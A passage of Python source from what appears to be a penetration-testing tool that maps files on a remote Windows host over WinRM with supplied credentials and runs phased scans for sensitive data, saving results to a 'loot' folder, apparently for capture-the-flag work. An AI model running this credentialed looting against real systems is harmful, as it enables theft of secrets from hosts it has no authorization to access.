            mapping_result = mapping_service.generate_file_map(
                psrp_service=_build_winrm_psrp_service(
                    domain=domain,
                    host=host,
                    username=username,
                    password=password,
                ),
                output_path=cache_manifest_abs,
                excluded_path_prefixes=excluded_path_prefixes,
                excluded_directory_names=excluded_directory_names,
                metadata=expected_cache_metadata,
            )
        except WinRMPSRPError as exc:
            print_error(f"WinRM PSRP mapping failed: {exc}")
            return {"completed": False, "error": str(exc)}
        mapping_duration_seconds = time.perf_counter() - mapping_started_at

    entries = list(mapping_result.get("entries") or [])
    mapping_roots = list(mapping_result.get("roots") or [])
    mapping_excluded_prefixes = list(mapping_result.get("excluded_path_prefixes") or [])
    mapping_excluded_names = list(mapping_result.get("excluded_directory_names") or [])
    if cache_reused:
        print_info(
            "Deterministic WinRM mapping reused from "
            f"{mark_sensitive(cache_manifest_rel, 'path')} "
            f"with {len(entries)} file entries."
        )
    else:
        print_info(
            "Deterministic WinRM mapping prepared at "
            f"{mark_sensitive(cache_manifest_rel, 'path')} "
            f"with {len(entries)} file entries in {mapping_duration_seconds:.2f}s."
        )
    print_info_debug(
        "WinRM deterministic mapping summary: "
        f"host={mark_sensitive(host, 'hostname')} roots={[mark_sensitive(root, 'path') for root in mapping_roots]} "
        f"excluded_prefixes={[mark_sensitive(root, 'path') for root in mapping_excluded_prefixes]} "
        f"excluded_directory_names={[mark_sensitive(name, 'path') for name in mapping_excluded_names]} "
        f"entries={len(entries)} duration_seconds={mapping_duration_seconds:.2f} "
        f"mapping_mode={mark_sensitive(mapping_mode, 'text')} "
        f"cache_reused={cache_reused} "
        f"cache_path={mark_sensitive(cache_manifest_rel, 'path')}"
    )
    if not entries:
        print_info("No files were discovered in the selected WinRM roots.")
        return {"completed": True, "phases_run": []}

    if method == "ai":
        return _run_winrm_ai_sensitive_data_scan(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            entries=entries,
            run_root_abs=run_root_abs,
        )

    phase_sequence = get_production_sensitive_scan_phase_sequence()
    results: list[dict[str, Any]] = []
    first_phase = phase_sequence[0]
    first_result = _run_winrm_sensitive_scan_phase(
        shell,
        domain=domain,
        host=host,
        username=username,
        password=password,
        phase=first_phase,
        entries=entries,
        run_root_abs=run_root_abs,
    )
    results.append(first_result)
    if not _should_continue_with_deeper_winrm_sensitive_scan(
        shell=shell,
        domain=domain,
        phase_result=first_result,
    ):
        return {"completed": True, "phases_run": results}

    for phase in phase_sequence[1:3]:
        phase_result = _run_winrm_sensitive_scan_phase(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            phase=phase,
            entries=entries,
            run_root_abs=run_root_abs,
        )
        results.append(phase_result)
        if bool(phase_result.get("aborted_due_to_auth_invalid")):
            print_warning(
                "Stopping remaining deterministic WinRM phases because the active "
                "WinRM credentials became invalid during this CTF workflow."
            )
            return {"completed": False, "phases_run": results}

    if _should_continue_with_heavy_winrm_artifact_analysis(
        shell=shell,
        domain=domain,
    ):
        phase_result = _run_winrm_sensitive_scan_phase(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            phase=SMB_SENSITIVE_SCAN_PHASE_HEAVY_ARTIFACTS,
            entries=entries,
            run_root_abs=run_root_abs,
        )
        results.append(phase_result)
        if bool(phase_result.get("aborted_due_to_auth_invalid")):
            print_warning(
                "Stopping remaining deterministic WinRM phases because the active "
                "WinRM credentials became invalid during this CTF workflow."
            )
            return {"completed": False, "phases_run": results}

    loot_root_rel = domain_relpath(
        shell.domains_dir,
        domain,
        DEFAULT_DOMAIN_LAYOUT.winrm,
        "sensitive",
        run_folder,
        "phases",
    )
    print_info(
        "Deterministic WinRM analysis completed. "
        f"Loot root: {mark_sensitive(loot_root_rel, 'path')}."
    )
    return {
        "completed": all(bool(item.get("completed")) for item in results if item),
        "phases_run": results,
    }
